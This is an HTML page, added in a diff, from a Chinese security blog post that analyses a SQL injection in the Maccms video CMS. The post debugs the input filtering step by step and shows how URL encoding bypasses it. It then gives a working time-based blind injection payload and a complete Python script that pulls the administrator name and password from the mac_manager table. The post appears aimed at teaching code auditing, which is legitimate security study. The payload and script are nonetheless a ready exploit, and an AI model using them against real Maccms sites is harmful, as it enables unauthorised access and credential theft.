@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/maccms-sql-injection-analysis.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="动态调试|Maccms SQL 注入分析(附注入盲注脚本) - F0rmat&#39;s Blog">
+    <meta property="og:title" content="动态调试|Maccms SQL 注入分析(附注入盲注脚本) - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="动态调试|Maccms SQL 注入分析(附注入盲注脚本) - F0rmat&#39;s Blog">
+    <meta name="description" content="0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。 0x02 环境 Web： phpstudy Sys">
+    <meta property="og:description" content="0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。 0x02 环境 Web： phpstudy Sys">
+    <meta property="twitter:description" content="0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。 0x02 环境 Web： phpstudy Sys">
+    <meta property="og:type" content="article">
+    <title>动态调试|Maccms SQL 注入分析(附注入盲注脚本) - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/maccms-sql-injection-analysis.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/maccms-sql-injection-analysis.html" title="动态调试|Maccms SQL 注入分析(附注入盲注脚本)">动态调试|Maccms SQL 注入分析(附注入盲注脚本)</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2018-08-26 15:49:02 UTC">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 26 Aug 2018
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            2063 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            5 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-环境">0x02 环境</a></li>
+    <li><a href="#0x03-漏洞复现">0x03 漏洞复现</a></li>
+    <li><a href="#0x04-sql执行过程分析">0x04 SQL执行过程分析</a></li>
+    <li><a href="#0x05-漏洞分析">0x05 漏洞分析</a></li>
+    <li><a href="#0x06-编写盲注脚本">0x06 编写盲注脚本</a></li>
+    <li><a href="#0x07-总结">0x07 总结</a></li>
+    <li><a href="#0x08-参考">0x08 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x01-前言">0x01 前言</h1>
+<p>已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。</p>
+<h1 id="0x02-环境">0x02 环境</h1>
+<p>Web： phpstudy
+System： Windows 10 X64
+Browser： Firefox Quantum
+Python version ： 2.7
+Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具</p>
+<p>搭建这个程序也挺简单的，也是一步到位。</p>
+<!-- raw HTML omitted -->
+<h1 id="0x03-漏洞复现">0x03 漏洞复现</h1>
+<ol>
+<li>首先在程序的后台添加一条数据
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/1.png" alt=""></li>
+<li>执行我们的payload,可以看到网站跳转延迟了3s以上。
+url:<code>http://sb.com/index.php?m=vod-search</code>
+post:<code>wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63</code></li>
+</ol>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/2.png" alt="">
+3. 因为是盲注所以注入出管理员的账号密码在下文分析。</p>
+<h1 id="0x04-sql执行过程分析">0x04 SQL执行过程分析</h1>
+<ol>
+<li>先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。
+因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/</li>
+<li>phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/4.png" alt=""></li>
+<li>我们先随便输入一点数据
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/3.png" alt="">
+访问后会断在index.php的第一行
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/5.png" alt=""></li>
+<li>F8往下走，走到第14行F7跟进去。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/6.png" alt="">
+然后F8一直往下走，可以看到拦截的规则
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/8.png" alt="">
+走到POST的过滤这里F7进去
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/7.png" alt="">
+<code>arr_foreach</code>函数检查传过来的值是否是数组，不是数组就返回原数据，然后用<code>urldecode</code>函数URL解码。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/9.png" alt="">
+最后分别对传过来的<code>wd</code>和<code>test</code>两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/10.png" alt="">
+比如你输入<code>wd=/**/</code>就会被拦截
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/11.png" alt="">
+因为<code>/**/</code>存在拦截的正则表达式里面。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/12.png" alt=""></li>
+<li>走出来会到<code>$m = be('get','m');</code>这里，这里只是对<code>m</code>传过来的<code>vod-search</code>进行<code>addslashes</code>函数的过滤
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/13.png" alt=""></li>
+<li>我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是<code>vod</code>，所以会包含<code>vod.php</code>文件并执行。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/14.png" alt=""></li>
+<li>因为我们传参是<code>search</code>所以会走到这里，我们可以F7进去看执行的过程。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/15.png" alt="">
+在这里会经过<code>urldecode</code>函数的解码，一直循环到不能解码为止，然后经过刚才的<code>StopAttack</code>方法的过滤
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/16.png" alt="">
+最后到<code>htmlEncode</code>方法的替换
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/17.png" alt=""></li>
+<li>跳出到<code>vod.php</code>文件后F8走到这里，F7进去看SQL执行的过程。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/18.png" alt="">
+一直走到<code>markname</code>的值是<code>vod</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/19.png" alt="">
+然后不用管F8继续往下走，走到这里再F7进去
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/20.png" alt="">
+可以看到SQL执行是到这里，下面是执行的语句
+<code>SELECT count(*) FROM {pre}vod WHERE 1=1  AND d_hide=0 AND d_type&gt;0  and d_type not in(0) and d_usergroup in(0)  AND ( instr(d_name,'test')&gt;0 or instr(d_subname,'test')&gt;0 or instr(d_starring,'test')&gt;0 ) </code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/21.png" alt=""></li>
+</ol>
+<h1 id="0x05-漏洞分析">0x05 漏洞分析</h1>
+<p>上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。</p>
+<ol>
+<li>刚才这里跳过了，文件位置：<code>inc/common/template.php</code>,可以看到传过来的<code>P[&quot;wd&quot;]</code>值赋值给了<code>$lp['wd']</code>。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/22.png" alt=""></li>
+<li>再往下看753~755行，可以看到我们的值是放在这里面，然后送去<code>GetOne</code>执行的。</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$lp</span><span class="p">[</span><span class="s1">&#39;wd&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">		        	<span class="nv">$where</span> <span class="o">.=</span> <span class="s1">&#39; AND ( instr(d_name,\&#39;&#39;</span><span class="o">.</span><span class="nv">$lp</span><span class="p">[</span><span class="s1">&#39;wd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;)&gt;0 or instr(d_subname,\&#39;&#39;</span><span class="o">.</span><span class="nv">$lp</span><span class="p">[</span><span class="s1">&#39;wd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;)&gt;0 or instr(d_starring,\&#39;&#39;</span><span class="o">.</span><span class="nv">$lp</span><span class="p">[</span><span class="s1">&#39;wd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;)&gt;0 ) &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		        <span class="p">}</span>
+</span></span></code></pre></div><ol start="3">
+<li>构造的语句,只有中间才是执行的语句，前一句是为了闭合单引号，后面是注释。如果这里不清楚的可以用MySQL监控的软件去一步一步弄清楚。</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">mac_vod</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">d_hide</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">d_type</span><span class="o">&gt;</span><span class="mi">0</span><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="n">d_type</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">in</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">d_usergroup</span><span class="w"> </span><span class="k">in</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w">  </span><span class="k">AND</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nf">instr</span><span class="p">(</span><span class="n">d_name</span><span class="p">,</span><span class="s1">&#39;))||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(3)),0)#\&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="nf">instr</span><span class="p">(</span><span class="n">d_subname</span><span class="p">,</span><span class="s1">&#39;))
+</span></span></span><span class="line"><span class="cl"><span class="s1"> ||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(3)),0)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> #\&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="nf">instr</span><span class="p">(</span><span class="n">d_starring</span><span class="p">,</span><span class="s1">&#39;))||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(5)),0)#\&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/23.png" alt="">
+4. 但是如果直接放语句上去会被检测到危险字符
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/24.png" alt="">
+它主要对我们这里的空格连接处匹配到了
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/25.png" alt="">
+那么我们可以用别名as 	‘	‘去代替，也可以省略as直接用	‘	‘，别名的用法在文章尾部的参考有给出。
+5. 我们再执行，用Seay的代码审计工具的Mysql监控软件查看，我们的空格和后面的<code>\</code>被转义了。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/26.png" alt="">
+还记得我们<code>chkSql</code>方法吗？先是执行<code>urldecode</code>解码，然后<code>StopAttack</code>匹配，最后<code>htmlEncode</code>编码，最后<code>Be</code>方法那里	还有一个<code>addslashes</code>函数过滤，所以会导致后面的<code>\</code>转义成<code>\\</code>。<code>htmlEncode</code>又会对前面的空格转义成<code>&amp;nbsp;</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">chkSql</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">global</span> <span class="nv">$getfilter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$s</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$d</span><span class="o">=</span><span class="nv">$s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$s</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$s</span><span class="o">==</span><span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$d</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">StopAttack</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$getfilter</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">htmlEncode</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/27.png" alt="">
+6. 这里我们可以利用URL编码绕过<code>htmlEncode</code>，具体可以看HTML URL编码表<code>%0c</code> <code>%0b</code>等都可以，后面的<code>\</code>可以用URL编码绕过<code>%5c</code>或者双编码<code>%25%35%63</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/28.png" alt="">
+7. 那么我们构造成的payload就是下面的，功能是查询管理员账号字段的长度
+<code>wd=))||if((select%0cascii(length((select(m_name)</code>from(mac_manager))))=53),(<code>sleep</code>(3)),0)#%5c``</p>
+<h1 id="0x06-编写盲注脚本">0x06 编写盲注脚本</h1>
+<p>当然盲注一般都不会手动去，SQLMAP有时候遇到特殊的也是要自己编写注入的脚本，具体代码的意思我就不解读了，自己可以结合Python和MySQL的知识理解。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/29.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#! /usr/bin/python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#author:F0rmat</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dict</span> <span class="o">=</span> <span class="s2">&#34;1234567890qwertyuiopasdfghjklzxcvbnm_</span><span class="si">{}</span><span class="s2">QWERTYUIOPASDFGHJKLZXCVBNM,@.?&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">UserName</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">UserPass</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">UserName_length</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://sb.com/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sa">r</span><span class="s1">&#39;/index.php?m=vod-search&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">UserName</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;))||if((select%0bascii(length((select(m_name)``from(mac_manager))))=</span><span class="si">{}</span><span class="s2">),(`sleep`(3)),0)#</span><span class="si">%25%</span><span class="s2">35%63&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;wd&#39;</span><span class="p">:</span> <span class="n">sql</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  <span class="c1"># 发送请求</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">UserName_length</span> <span class="o">=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="n">UserName_length</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">UserName_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">dict</span><span class="p">:</span>  <span class="c1"># 遍历取出字符</span>
+</span></span><span class="line"><span class="cl">            <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;))||if((select%0bascii(substr((select(m_name)``from(mac_manager)),</span><span class="si">{}</span><span class="s2">,1))=</span><span class="si">{}</span><span class="s2">),(`sleep`(3)),0)#</span><span class="si">%25%</span><span class="s2">35%63&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;wd&#39;</span><span class="p">:</span> <span class="n">sql</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  <span class="c1"># 发送请求</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">UserName</span> <span class="o">+=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">UserPass</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">dict</span><span class="p">:</span>  <span class="c1"># 遍历取出字符</span>
+</span></span><span class="line"><span class="cl">            <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;))||if((select%0bascii(substr((select(m_password)``from(mac_manager)),</span><span class="si">{}</span><span class="s2">,1))=</span><span class="si">{}</span><span class="s2">),(`sleep`(3)),0)#</span><span class="si">%25%</span><span class="s2">35%63&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;wd&#39;</span><span class="p">:</span> <span class="n">sql</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  <span class="c1"># 发送请求</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">UserPass</span> <span class="o">+=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s1">&#39;username:&#39;</span><span class="o">+</span><span class="n">UserName</span><span class="p">,</span><span class="s1">&#39;password:&#39;</span><span class="o">+</span><span class="n">UserPass</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><h1 id="0x07-总结">0x07 总结</h1>
+<p>有时候学习代码审计，不能因为部分的代码没能读懂就不去理会，其实你读的代码越多，做代码审计也越轻松。</p>
+<h1 id="0x08-参考">0x08 参考</h1>
+<p>程序下载：https://www.lanzous.com/i1qm24f
+<a href="http://www.freebuf.com/column/161528.html">http://www.freebuf.com/column/161528.html</a>
+<a href="http://www.mysqltutorial.org/mysql-alias/">http://www.mysqltutorial.org/mysql-alias/</a>
